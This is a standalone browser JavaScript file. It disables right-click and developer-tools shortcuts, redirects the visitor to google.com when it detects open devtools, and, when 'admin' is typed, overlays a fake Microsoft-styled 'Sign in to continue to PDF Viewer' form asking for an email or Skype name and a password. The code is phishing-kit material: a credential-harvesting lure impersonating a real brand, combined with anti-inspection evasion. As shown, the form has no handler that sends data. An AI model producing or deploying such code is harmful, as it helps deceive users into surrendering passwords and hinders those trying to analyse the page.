document.addEventListener("contextmenu", (e) => e.preventDefault());
document.addEventListener("keydown", (e) => {
  if (
    e.key === "F12" ||
    (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
    (e.ctrlKey && e.key.toLowerCase() === "u")
  ) {
    e.preventDefault();
  }
});

let devtoolsOpen = false;
const checkDevTools = () => {
  const threshold = 160;
  if (
    window.outerWidth - window.innerWidth > threshold ||
    window.outerHeight - window.innerHeight > threshold
  ) {
    devtoolsOpen = true;
    window.location.replace("https://www.google.com");
  } else {
    devtoolsOpen = false;
  }
};

setInterval(checkDevTools, 1000);

let keyword = "admin";
let typedInput = "";

document.addEventListener("keydown", (e) => {
  typedInput += e.key;
  if (typedInput.includes(keyword)) {
    showFakeLogin();
    typedInput = "";
  }
});

function showFakeLogin() {
  let overlay = document.createElement("div");
  overlay.style.position = "fixed";
  overlay.style.top = "0";
  overlay.style.left = "0";
  overlay.style.width = "100%";
  overlay.style.height = "100%";
  overlay.style.background = "rgba(0, 0, 0, 0.6)";
  overlay.style.zIndex = "9999";
  
  let popup = document.createElement("div");
  popup.style.position = "fixed";
  popup.style.top = "50%";
  popup.style.left = "50%";
  popup.style.transform = "translate(-50%, -50%)";
  popup.style.width = "420px";
  popup.style.background = "#ffffff";
  popup.style.padding = "40px";
  popup.style.boxShadow = "0px 4px 20px rgba(0, 0, 0, 0.2)";
  popup.style.borderRadius = "10px";
  popup.style.fontFamily = "Segoe UI, Arial, sans-serif";
  popup.style.textAlign = "center";
  popup.style.position = "relative";

  let closeButton = document.createElement("span");
  closeButton.innerHTML = "&times;";
  closeButton.style.position = "absolute";
  closeButton.style.top = "10px";
  closeButton.style.right = "15px";
  closeButton.style.fontSize = "24px";
  closeButton.style.cursor = "pointer";
  closeButton.onclick = () => {
    document.body.removeChild(overlay);
  };

  popup.innerHTML = `
    <img src="pdfviewer.png" alt="PDF Viewer" style="width: 200px; margin-bottom: 20px;">
    <h2 style="color: #1b1b1b; font-size: 24px; font-weight: 600;">Sign in</h2>
    <p style="color: #666; font-size: 16px; margin-bottom: 20px;">to continue to PDF Viewer</p>
    <input type="text" placeholder="Email, phone, or Skype" style="width: 93.7%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; display: block; font-size: 16px;">
    <input type="password" placeholder="Password" style="width: 93.7%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; display: block; font-size: 16px;">
    <button style="background: #0078D4; color: white; padding: 14px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; font-weight: 600;">Next</button>
    <p style="color: #0078D4; font-size: 14px; margin-top: 15px; cursor: pointer;">Forgot password?</p>
  `;

  popup.appendChild(closeButton);
  overlay.appendChild(popup);
  document.body.appendChild(overlay);
}
